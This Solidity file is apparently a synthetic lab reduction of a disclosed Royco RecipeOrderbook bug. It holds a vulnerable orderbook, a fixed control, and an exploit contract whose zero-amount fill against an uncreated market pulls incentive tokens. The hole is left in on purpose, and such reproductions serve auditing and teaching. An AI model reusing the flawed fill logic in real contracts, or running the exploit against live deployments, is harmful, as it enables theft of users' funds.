// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Royco RecipeOrderbook — null Weiroll market still pulls incentives (Cantina, 46675)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: fillAmount == 0 skips the remaining-quantity revert, and a market id
    that was never created reads as rewardStyle 0 (Upfront). The filler then
    safeTransferFroms tokenAmountsRequested to order.lp. */

contract MockERC20 {
    string public name = "Incentive";
    string public symbol = "INC";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amount, "allowance");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract RecipeOrderbook {
    enum RewardStyle { Upfront, Arrear, Forfeitable }

    struct Order {
        address lp;
        uint256 targetMarketID;
        address[] tokensRequested;
        uint256[] tokenAmountsRequested;
    }

    struct WeirollMarket {
        RewardStyle rewardStyle;
        address inputToken;
    }

    mapping(bytes32 => uint256) public orderHashToRemainingQuantity;
    mapping(uint256 => WeirollMarket) public marketIDToWeirollMarket;
    bool public immutable enforceRemaining;

    error NotEnoughRemainingQuantity();

    constructor(bool enforce) {
        enforceRemaining = enforce;
    }

    function getOrderHash(Order memory order) public pure returns (bytes32) {
        return keccak256(abi.encode(order.lp, order.targetMarketID, order.tokensRequested, order.tokenAmountsRequested));
    }

    function fillLPOrder(Order memory order, uint256 fillAmount) external {
        bytes32 orderHash = getOrderHash(order);
        if (enforceRemaining) {
            require(orderHashToRemainingQuantity[orderHash] > 0, "no quantity");
        }
        if (fillAmount > orderHashToRemainingQuantity[orderHash]) revert NotEnoughRemainingQuantity();
        orderHashToRemainingQuantity[orderHash] -= fillAmount;

        WeirollMarket memory market = marketIDToWeirollMarket[order.targetMarketID];
        uint256 n = order.tokensRequested.length;
        for (uint256 i; i < n; ++i) {
            if (market.rewardStyle == RewardStyle.Upfront) {
                // @> VULN: a never-created market is rewardStyle 0 (Upfront), so a zero fill still pulls tokenAmountsRequested
                MockERC20(order.tokensRequested[i]).transferFrom(msg.sender, order.lp, order.tokenAmountsRequested[i]);
            }
        }
    }
}

contract Exploit {
    uint256 public constant N = 1000 ether;
    address public constant LP = 0x2222222222222222222222222222222222222222;

    MockERC20 public token; // nonce 1
    RecipeOrderbook public book; // nonce 2
    RecipeOrderbook public fixedBook; // nonce 3

    uint256 public moved;
    uint256 public controlKept;

    constructor() {
        token = new MockERC20();
        book = new RecipeOrderbook(false);
        fixedBook = new RecipeOrderbook(true);
        token.mint(address(this), N * 2);
    }

    function run() external {
        address[] memory tokens = new address[](1);
        tokens[0] = address(token);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = N;
        RecipeOrderbook.Order memory order = RecipeOrderbook.Order({
            lp: LP,
            targetMarketID: 999,
            tokensRequested: tokens,
            tokenAmountsRequested: amounts
        });

        uint256 fillerBefore = token.balanceOf(address(this));
        require(fillerBefore == N * 2, "funded");
        require(book.orderHashToRemainingQuantity(book.getOrderHash(order)) == 0, "null order");
        token.approve(address(book), N);
        book.fillLPOrder(order, 0);
        moved = token.balanceOf(LP);
        require(moved == N, "N not moved");
        require(token.balanceOf(address(this)) == N, "filler lost N");

        uint256 kept = token.balanceOf(address(this));
        token.approve(address(fixedBook), N);
        try fixedBook.fillLPOrder(order, 0) {
            revert("control filled a null order");
        } catch {}
        controlKept = token.balanceOf(address(this));
        require(controlKept == kept, "control moved tokens");
    }
}
